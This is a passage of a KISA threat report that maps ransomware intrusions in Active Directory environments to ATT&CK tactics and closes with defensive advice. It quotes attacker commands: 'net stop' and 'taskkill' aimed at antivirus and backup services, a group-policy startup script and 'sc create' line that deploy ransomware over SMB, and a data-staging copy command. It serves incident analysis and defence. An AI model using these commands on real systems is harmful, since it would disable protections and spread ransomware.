K Collection
 Data from Local System: Data collection from the local system
To collect information from a target system, commercial tools and a remote control malicious code is used.
The remote control malicious code includes a function to collect and leak the target system information.
Internal company information collected from target systems are used for blackmail.

AD environment network information collection and weakness information discovery

TTPs#5 : attack patterns in AD environment

pingcastle.exe

AD environment network information collection and weakness information discovery

powerkatz.dll

Process information collection tool

procexp64.exe

44

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

Information stolen from malicious code
Value name

Description

id

Unique ID value

os

System OS information

priv

Malicious code execution privileges + UAC activation status

pred

User path

pcname

System name

avname

Vaccine information

build_time

Malicious code execution time

card

NFC information

TTPs#5 : attack patterns in AD environment

 Archive Collected Data – Archive via Custom Method: Data compression through user implemented
encryption algorithms
Data collected from target system memory is encoded with custom XOR and leaked.

Infected system
memory

Process
1

4. data leak

1. monitoring
Process
N-M

2. data extraction
3. XOR encryption

Process
N

45

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

L Exfiltration
 Exfitration Over C2 Channel: CA channel leak
Data collected from target servers are leaked to attacker C2 servers.

copy
\\[IP]\c$\ProgramData\rj_log.dat
c:\temp\[Host명]_rj_log.dat

base server

DAT

Server 1

3.*_rj_log.dat leak

2. rj_log.dat
collection
DAT

DAT

TTPs#5 : attack patterns in AD environment

1. Batch file
execution

rj_log.dat

DAT

Attack C2

[Host명]_rj_log.dat

rj_log.dat

Server 2

46

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

M Impact
 Service Stop: Service stopping
 he services and processes running in the target system are shut down to avoid detection and smooth
T
data encryption.

Used commands
net stop [service name] /y

Process shutdown

taskkill /IM[process name] /F

Type

Name

TTPs#5 : attack patterns in AD environment

Service stopping

McAfeeEngineService, Symantec System Recovery, NetMsmqActivator,
MSExchangeMGMT, SepMasterService, tmlisten, BackupExecDeviceMediaService,
ShMonitor, VeeamRESTSvc, BackupExecVSSProvider, MsDTsServer, VeeamDepolySvc,
Service

SQLAgent$PROD, Sophos Message Router, McShield, BackupExecJobEngine, swi_filter,
Sophos AutoUpdate Service, Sophos MCS Agent, MsDtsServer100, IMAP4Svc,
SQLSERVERAGENT, SQLsafe Filter Service, Antivirus, DCAgent, SQLAgent$bkupexec,
MSSQLSERVER,
dbsnmp.exe, steam.exe, PNTMon.exe, dbeng50.exe, powerpnt.exe, firefoxonfig.exe,

Process

mspub.exe, mysqld-opt.exe, isplplussv.exe
wordpad.exe, steam.exe, onenote.exe, mysqld.exe, outlook.exe

47

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Data Encrypted for Impact: Data encryption
AD administrator rights are acquired for ransomware distribution and two methods are used: ① DC group
policy object distribution and ② SMB service creation.
File encryption uses the RC4 algorithm, and the key used for file encryption is encrypted with the attacker's
open key and saved in a file. If the file is smaller than the size set by the attacker, the entirety of data is
encrypted, and if the size is exceeded, only certain sizes are encrypted to speed up the process.

Ransomware distribution policy script

Ransomware service creation through SMB

TTPs#5 : attack patterns in AD environment

[Startup]
0CmdLine=cmd.exe
0Parameters=/c "copy /y \\Windows\
SysVol\[DomainName]\Policies\[PolicyGUID]\

시스템에 서비스가 설치되었습니다.
서비스 이름: WinTempLocal
서비스 파일 이름: C:₩windows₩localserv.exe

Machine\Scripts\Startup\wsusrv.exe C:\

서비스 유형: 사용자 모드 서비스

WINDOWS\tasks\wsusrv.exe && sc create

서비스 시작 유형: 자동 시작

msdtcstefsrv binPath= "C:\WINDOWS\tasks\

서비스 계정: LocalSystem

wsusrv.exe" start= auto && sc start msdtcstefsrv"

Ransomware encryption method
- Each encryption target file is assigned a new encryption key
- The open key inserted in the malicious code is used for encryption, and the encrypted key information is inserted at the end of the encrypted file

48

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

N Command and Control
 Remote Access Software: Remote access software
 Application Layer Protocol - Web Protocols: web protocols
For the execution of various remote commands, Ammyy RAT and Amadey Bot are used.
Ammyy RAT receives additional commands from the attacker’s server. The received commands are
copied to the pre-allocated memory area, and the allocated memory is executed.
The Amadey Bot malicious code performs various functions such as key logging, remote control, additional
file download (EmailStealer, Flawed Ammyy) depending on the commands received.

TTPs#5 : attack patterns in AD environment

Ammyy RAT command execution process
Remote control malicious code
1. Infected system
information acquisition

2. Memory acquisition
Information leak

5. Writing
commands
to memory

3. Leaking of acquired information
from infected system
attacker command
control server
4. Command reception

command
transfer

6. Command execution

 Ingress Tool Transfer: Ingress tool transfer
 MB is used to register malicious code download/execution commands as a service. Commands are
S
executed through Powershell and WMIC and the attacker's distribution location server is used to download
malicious codes and execute the codes as a batch file.

2. Service execution

PC 1

smb
1. Service registration

PC 1
4. Command control

C2
3. Malicious code download

49

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

Service installation

TTPs#5 : attack patterns in AD environment

 Protocol Tunneling: protocol tunneling
The Tinymet malicious code (a protocol tunneling tool) is used.

50

4.
Conclusion

「Tactics, Techniques, Procedures」

4. Conclusion

【Defender‘s Insight】
The Korea Internet and Security Agency has taken a look at the types of ransomware infection attacks that

TTPs#5 : attack patterns in AD environment

occurred in AD environments. Attackers used spear-phishing infiltration, DC server domination after account
theft, and SMB internal transfer to infect using ransomware. Such accidents cause major damage including the
payment demanded by the attacker, damage to the corporation’s image, system recovery costs, etc. and an
AD environment being infected leads to the entire system being dominated and additional damage including
leaking of important corporate information.

Hacking attempts against corporations will continue to occur, and corporations using AD will continue to be
targeted. Each corporation has a unique composition, privilege management, security policies, etc. and the
infiltration method and detailed attack methods could change, but privilege elevation, account theft, SMB internal
transfer, etc. are commonalities found in most AD incidents.

As such, corporations using an AD environment must place priority on account management and monitoring.
An attacker that succeeds in initial infiltration will move with administrator account theft in mind, searching the
internal network; stealing normal user accounts will not aid in the domination of the internal network. Even if
accounts are stolen, the user and service account privileges must be kept separate so that the AD domain
controller server cannot be dominated. The administrator group account use should be minimized, and systems
forced to use an administrator account should be regularly monitored. In the case of AD DC in particular, a great
deal of attention must be paid to registered services and group policy lists to check for suspicious activity. Major
system logs should be regularly backed up, and if account theft tools are detected or pipe communication is
found, the copy system must be immediately inspected.

KISA has published a detailed tech report on AD environment incidents in early 2019. That report dealt with
a single incident and focused on attack techniques, procedures, malicious code analysis, etc. while this report
deals with various incidents that occurred between 2019 and 2021, listing the attack methods of attackers
according to an ATT&CK matrix. Even if the attack group attack types change in the future, the attack methods
used against AD environments will not vary greatly.
Understanding and ascertaining all the TTP strategies in the previous tech report and the current one will be of
great help in application to internal corporate environments, prediction of security threats, and reorganization of
security.

51